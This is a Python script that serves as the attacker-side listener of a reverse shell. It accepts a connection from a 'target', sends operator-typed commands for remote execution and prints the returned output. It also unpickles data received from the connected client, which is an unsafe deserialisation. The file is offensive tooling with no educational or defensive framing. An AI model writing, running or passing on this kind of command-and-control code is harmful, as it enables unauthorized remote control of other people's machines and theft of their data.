import socket, sys, pickle
from argparse import ArgumentParser

def get_arguments():
    parser = ArgumentParser()
    parser.add_argument("-i", "--server-ip", action="store", dest="server_ip",
    help="The IP Address To Be Used By The Server", metavar="<IP>", required=True)
    parser.add_argument("-p", "--server-port", action="store", default=8080, 
    dest="server_port", help="The Port To Be Used By The Server", metavar="<PORT>", 
    required=True, type=int)
    args = parser.parse_args()
    return args
if __name__ == "__main__":
    try:
        args = get_arguments()
        print(f"[+] Initializing The Server")
        socket = socket.socket()
        socket.bind((args.server_ip, args.server_port))
        socket.listen(1)
        print(f"[+] Server Initizalized. Waiting For Connections")
        target_socket, target_address = socket.accept()
        print(f"[+] The Client {target_address} Has Connected To The Server")

        while True:
            command = input(">>> ").encode(encoding="latin1")
            if command.decode(encoding="latin1") == ("exit"):
                print("[-] Closing The Session")
                target_socket.send(("exit").encode(encoding="latin1"))
                target_socket.close()
                sys.exit()
            target_socket.send(command)
            output_length = pickle.loads(target_socket.recv(4096))
            output = target_socket.recv(int(output_length))
            print(output.decode(encoding="latin1"))
    except KeyboardInterrupt:
        print("\nClosing The Session")
        target_socket.send(("exit").encode(encoding="latin1"))
        target_socket.close()
        sys.exit()
    except:
        print("\nAn Unexpected Error Has Ocurred")
